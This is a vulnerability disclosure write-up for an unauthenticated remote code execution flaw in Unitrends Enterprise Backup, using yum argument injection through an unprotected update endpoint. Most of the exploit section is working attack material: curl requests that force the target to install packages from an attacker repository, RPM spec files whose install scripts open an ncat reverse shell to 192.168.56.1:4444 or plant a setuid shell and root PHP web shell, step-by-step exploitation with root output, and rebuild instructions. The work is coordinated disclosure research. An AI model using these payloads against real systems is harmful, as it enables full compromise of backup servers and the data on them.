Unitrends Enterprise Backup &lt;= 9.1.0-2 unauthenticated RCE via ```yum``` argument injection
======================================================================================

Contents
--------

* [Product information](#product-information)
* [Foreword](#foreword)
* [Vulnerability description](#vulnerability-description)
* [The PoC exploit](#the-poc-exploit)
* [Disclosure timeline](#disclosure-timeline)

Product information
-------------------

|||
|-|-|
| Name | Unitrends Enterprise Backups |
| Description | Unitrends Backup software simplifies local backup and offsite compliance requirements with all-in-one software that delivers enterprise backup and continuity to your business. |
| Tested versions | 8.2.0-6 and 9.1.0-2 |
| Homepage | https://www.unitrends.com/ |
| Installer | ftp://ftp.unitrends.com/utilities/installable-ueb.zip |
| SHA1 (8.2.0-6) | 36fe29229b53e39c0860453fcd25c267d131ddac |
| SHA1 (9.1.0-2) | a939ef9e776b3390056c95075cea43a8b2d158f2 | 

Foreword
--------

This vulnerability was interesting to me because of two reasons. One of the reasons is that the RCE part uses an argument injection that is not based on one of the well-known "injectable" commands (```zip -T -TT```, ```man -P```, ```find -exec```, ```tar --checkpoint --checkpoint-action```, etc.), but on ```yum```. 

The other reason is that I've found it using find+grep, but I was not searching for dangerous functions, but for comments:

```
$ find . -name "*.php" -exec grep -EH "XXX|TODO|FIXME|NOTE|HACK|BUG" {} \; 
```

These should not be present in production code in an ideal world, but they often are, and usually mark code parts that worth taking a look at. By the way, sometimes grepping for curse words to find exceptionally complex code pieces pays off too :)

Vulnerability description
-------------------------

The vulnerability is caused by two factors:
    
* The lack of authorization check on the update functionality.
* Improperly filtered input used as command line parameter to ```yum```.
   
The following snippet from ```/recoveryconsole/bpl/bp.php``` file is responsible for allowing acces without authentication by setting the ```$this->m_bBypassCookie``` to ```true```, if ```/recoveryconsole/bpl/updates.php``` script is being called with the right query string. As you can see, there's even a comment about fixing it in the future:

```php
function filterAuthCookieForLocalHost( $auth_cookie ) {
		// called from command line
		global $Log;
		//$Log->writeVariable( "server address:" );
		//$Log->writeVariable( $_SERVER['QUERY_STRING']);
		//$Log->writeVariable( $_SERVER['PHP_SELF'] );
		$this->m_bBypassCookie = false;

		// Checking to see if the update script ( list or update ) is the one being called
		// TODO:  once the new auth token is in the field - we need to pull this out since
		// it would allow an unauthorized user to update a system - possibly compromising it
		$isUpdateScript  = $_SERVER['PHP_SELF'] === "/recoveryconsole/bpl/updates.php";
		if ( isset($_SERVER['QUERY_STRING']) ) {
			$isUpdateCommand = strpos($_SERVER['QUERY_STRING'], "type=update&sid=") === 0;
			$isListCommand = strpos($_SERVER['QUERY_STRING'], "type=list&sid=") === 0;
		}

	if ( php_sapi_name() === 'cli' || '127.0.0.1' === $_SERVER['SERVER_ADDR'] ||
		getenv('bypassCookie') === 'true' ||
		( $isUpdateScript && ( $isUpdateCommand || $isListCommand ) ) ) {
		//$Log->writeVariable( "call from local context");
		//$Log->writeVariable( php_sapi_name() );

		$this->m_bBypassCookie = true;
	}
	return $auth_cookie;
}
```

It's also worth noting, that requests initiated from localhost also bypass authorization, which means that e.g. an SSRF vuln could give full access to the Unitrends application!

If we initiate an update, the ```bp_install_updates``` function gets called, which is implemented in ```/usr/lib64/libbpext.so.1```. This function runs the ```cmc_updates install``` command with the parameters given in the ```names``` query parameter for the ```updates.php``` script:

```asm
[0x0012fdb3]> pd
	||||   0x0012fdb3      4889df         mov rdi, rbx
	||||   0x0012fdb6      e805a4f2ff     call 0x5a1c0
	||||   0x0012fdbb      488d15822729.  lea rdx, str.cmc_updates_install__s ; 0x3c2544 ; str.cmc_updates_install__s ; "cmc_updates install %s" @ 0x3c2544
	||||   0x0012fdc2      488d3d922729.  lea rdi, str.install_updates ; 0x3c255b ; str.install_updates ; "install updates" @ 0x3c255b
	||||   0x0012fdc9      4889c1         mov rcx, rax
	||||   0x0012fdcc      4889ee         mov rsi, rbp
	||||   0x0012fdcf      31c0           xor eax, eax
	||||   0x0012fdd1      e81a44f2ff     call 0x541f0
```

The function at 0x541f0 is ```runShellCommand_32```:

```asm
[0x000541f0]> pd
	|||||||   0x000541f0      ff252a0c6f00   jmp qword [reloc.runShellCommand_32]
```

The ```cmc_updates``` command is a shell script (```/usr/bp/bin/cmc_updates```) that calls ```yum``` with the given parameters:

```shell
...

# now install any others
if (length $escaped_string_others) {
	cleanAllPackages($statusfile);
	system("yum -y -d 0 install $escaped_string_others >>$statusfile 2>&1");
	$ret = $ret || ($? >> 8);
}

...
```

The ```yum``` command has a ```--config``` argument, which is used to set the path to a ```yum``` configuration file. This path does not have to be a local path, but can be an ```http://```, or an ```ftp://``` link too. This makes it possible for an unauthenticated attacker to create a ```yum``` config file that points to a repository he controls, and install anything from that repo with a ```HTTP GET``` request similar to this:

```
[0x00 poc]$ curl 'http://192.168.56.100/recoveryconsole/bpl/updates.php?type=update&sid=0&names=--config=http://192.168.56.1:8080/yum.conf,package-name-we-want-to-install' -s -o /dev/null
```

This obviously means that an attacker can install anything she wants, but direct code execution is also possible using install scripts in the RPM files. I've created a proof-of-concept RPM file that puts a PHP shell in the webroot, and another, that starts a connectback shell using pre-install (%pre) scripts.

The PoC exploit
---------------

### Exploit contents

The ```poc``` directory contains everything that is needed to exploit this vulnerability. It is important, that the PoC assumes that the Unitrends server can access an attacker-controlled server with an IP address of ```192.168.56.1``` on port ```8080```. This IP address and port can be altered by modifying the ```baseurl``` parameter in the
```evil.repo``` config file.

```ini
[evilrepo]
name=Evil Repository
baseurl=http://192.168.56.1:8080/
enabled=1
gpgcheck=0
```

The ```evilrepo``` folder is a ```yum``` repository that contains two rpm files:

* ```connectback.rpm```: Creates a connectback shell to ```192.168.56.1:4444```. In order to modify the IP and/or port, the RPM, and the repository have to be rebulit. See section [Customization](#customization) for instructions!
* ```phpshell.rpm```: Puts a file called ```_.php``` to the webroot that executes the value of ```cmd``` query parameter as root.

The .spec files for these RPMs:

```
Summary: Empty RPM with connectback shell
Name: connectback
Version: 0
Release: 0
License: Public
Group: Application/System
%description
Empty RPM with connectback shell
%pre
/usr/bin/ncat -e /bin/sh 192.168.56.1 4444
false
%files
```

```
Summary: Package that installs a root PHP shell
Name: phpshell
Version: 0
Release: 0
License: Public
Group: Application/System
%description
Package that installs a root PHP shell
%pre
cp /bin/dash /bin/_
chmod +s /bin/_
echo "<?php print passthru('/bin/_ -c \"'.\$_GET['cmd'].'\"');?>" > /var/www/html/_.php
%files
```

### Exploitation steps for connectback shell

1. Publish the yum repository! I'm used to Python's SimpleHTTPServer, but of course any other HTTP server works.

```
[0x00 unitrends]$ cd poc/evilrepo
[0x00 evilrepo]$ python -mSimpleHTTPServer 8080
```

2. Start a listener in another terminal!
   
```
[0x00 unitrends]$ nc -lv 4444
```

3. Initiate the update!

```
[0x00 unitrends]$ curl 'http://192.168.56.100/recoveryconsole/bpl/updates.php?type=update&sid=0&names=--config=http://192.168.56.1:8080/evil.repo,connectback' -s -o /dev/null
```

4. Go back to your netcat listener, and profit!
   
```
[0x00 unitrends]$ nc -lv 4444
Connection from 192.168.56.101 52338 received!
id
uid=0(root) gid=0(root) groups=0(root),500(loggers)
uname -a
Linux localhost.localdomain 2.6.32-504.1.3.el6_bp.x86_64 #1 SMP Fri Nov 21 16:41:42 EST 2014 x86_64 x86_64 x86_64 GNU/Linux
```

### Exploitation steps for PHP backdoor

1. Publish the yum repository! I'm used to Python's SimpleHTTPServer, but of course any other HTTP server works.

```
[0x00 unitrends]$ cd poc/evilrepo
[0x00 evilrepo]$ python -mSimpleHTTPServer 8080
```

2. Initiate the update!
   
```
[0x00 unitrends]$ curl -k 'https://192.168.100.100/recoveryconsole/bpl/updates.php?type=update&sid=0&names=--config=http://192.168.100.1:8080/evil.repo,phpshell' -s -o /dev/null
```

3. Profit!

``` 
[0x00 ~]$ curl -k 'https://192.168.100.100/_.php?cmd=id'
uid=48(apache) gid=48(apache) euid=0(root) egid=0(root) groups=0(root),48(apache),500(loggers)
[0x00 ~]$ curl -k 'https://192.168.100.100/_.php?cmd=uname+-a'
Linux localhost.localdomain 2.6.32-642.11.1.el6.x86_64 #1 SMP Fri Nov 18 19:25:05 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

### Problem with repo keys

When I've tried the exploit with a saved 8.2 version Unitrends instance, ```yum``` was complaining about verifying keys for the ```pgdg92``` repository, so the attack failed. This is easily circumvented however, by disabling that repo temporarly:

```
[0x00 unitrends]$ curl 'http://192.168.56.100/recoveryconsole/bpl/updates.php?type=update&sid=0&names=--config=http://192.168.56.1:8080/evil.repo,--disablerepo=pgdg92,phpshell' -s -o /dev/null
```
   
### Customization

You will need two tools to customize this exploit: ```rpmbuild``` to build an rpm from a ```.spec``` file, and ```createrepo``` to create the repository metadata. I'm going to show how the process is done by recreating the evilrepo from the ```.spec``` files:

```
[0x00 poc]$ ls -1
connectback.spec
evilrepo
phpshell.spec

# ... modify .spec files, e.g. use another IP/port for the connectback shell

[0x00 poc]$ rpmbuild connectback.spec -bb --target x86_64-centos-linux --define "_topdir ./rpmbuild"
Building target platforms: x86_64-centos-linux
Building for target x86_64-centos-linux
error: Failed to resolve symbol syslog_hooks: Undefined symbol "nspr_use_zone_allocator"
Processing files: connectback-0-0.x86_64
Checking for unpackaged file(s): /usr/local/lib/rpm/check-files ./rpmbuild/BUILDROOT/connectback-0-0.%{_arch}
Wrote: ./rpmbuild/RPMS/x86_64/connectback-0-0.x86_64.rpm
Executing(%clean): /bin/sh -e /var/tmp/rpm-tmp.cprp6P
+ umask 022
+ cd ./rpmbuild/BUILD
+ /bin/rm -rf ./rpmbuild/BUILDROOT/connectback-0-0.%{_arch}
+ exit 0
[0x00 poc]$ rpmbuild phpshell.spec -bb --target x86_64-centos-linux --define "_topdir ./rpmbuild"
Building target platforms: x86_64-centos-linux
Building for target x86_64-centos-linux
error: Failed to resolve symbol syslog_hooks: Undefined symbol "nspr_use_zone_allocator"
Processing files: phpshell-0-0.x86_64
Checking for unpackaged file(s): /usr/local/lib/rpm/check-files ./rpmbuild/BUILDROOT/phpshell-0-0.%{_arch}
Wrote: ./rpmbuild/RPMS/x86_64/phpshell-0-0.x86_64.rpm
Executing(%clean): /bin/sh -e /var/tmp/rpm-tmp.yAK4yg
+ umask 022
+ cd ./rpmbuild/BUILD
+ /bin/rm -rf ./rpmbuild/BUILDROOT/phpshell-0-0.%{_arch}
+ exit 0
[0x00 poc]$ mkdir evilrepo_new
[0x00 poc]$ cp rpmbuild/RPMS/x86_64/connectback-0-0.x86_64.rpm evilrepo_new/connectback.rpm
[0x00 poc]$ cp rpmbuild/RPMS/x86_64/phpshell-0-0.x86_64.rpm evilrepo_new/phpshell.rpm
[0x00 poc]$ cd evilrepo_new
[0x00 evilrepo_new]$ createrepo .
Spawning worker 0 with 2 pkgs
Workers Finished
Saving Primary metadata
Saving file lists metadata
Saving other metadata
Generating sqlite DBs
Sqlite DBs complete
[0x00 evilrepo_new]$ ls -1 ./repodata
0cee6579fb8b0c20891dc0736ad9b8703c56bacb588ed123184f5e8428902354-other.sqlite.bz2
16e395020135d6a89e2855c3a2192381ad6d104611ccec9d8446b4a5b9d8ea65-filelists.xml.gz
179a5529ed4d17de07551dcf4fab882d11457b561a43ce7836aa45b07765cd50-filelists.sqlite.bz2
43e016d71c36f84b231d20d8a62d0c275223a9e28663d6edcd76b2f4dd4a04a5-other.xml.gz
5ea0c08d8b25ed8daf6a593f4efb8b2e7956bbb1093734b2fab128be010348b3-primary.sqlite.bz2
7c2364c132701cd1e31260051bd54156b15c1e58da64956f87737350c2286a0a-primary.xml.gz
repomd.xml
[0x00 evilrepo_new]$ cp ../evilrepo/evil.repo ./new.evil.repo

# ... modify ./new.evil.repo, e.g. use a different IP and/or port for baseurl
```
 
Disclosure timeline
-------------------

* **12/20/2016**: Sent contact request to several @unitrends.com addresses.
* **12/20/2016**: A Unitrends employee responded, I told him I found a vuln in UEB, and asked for a PGP key.
* **12/20/2016 - 12/26/2016**: No PGP, so we were discussing what options we have to send the details securely. It took a long time, because of Christmas, plus we had some technical difficulties too (I couldn't send SMS to neither of his phone numbers)
* **12/26/2016**: Sent vuln details and PoC.
* **1/19/2017**: No response yet, so I sent another e-mail asking if they had any question.
* **3/9/2017**: Still no response. Sent another mail, in which I told him I plan to disclose the vuln at the end of March.
* **3/13/2017**: Got a response, he apologized for the delay, and told me they have a fix for the vuln. It was not clear to me if the fix was published yet, and had zero free time to check it at the time.
* *(3/24/2017 - : There was a delay on my part here, but we are exchanging e-mails now about not strictly related matters.)*
* **4/21/2017**: Saw the RHINO Security Labs blog posts ([1](https://rhinosecuritylabs.com/research/remote-code-execution-bug-hunting-chapter-1/), [2](https://rhinosecuritylabs.com/research/remote-code-execution-bug-hunting-chapter-2/)) about Unitrends vulns, had a mini heart attack, but confirmed that none of their vulns was the one I've been discussing with Unitrends :) Anyways, those posts informed me that there is a new UEB version. After checking and verifying that updates.php can no longer be run without authentication, I published this post.
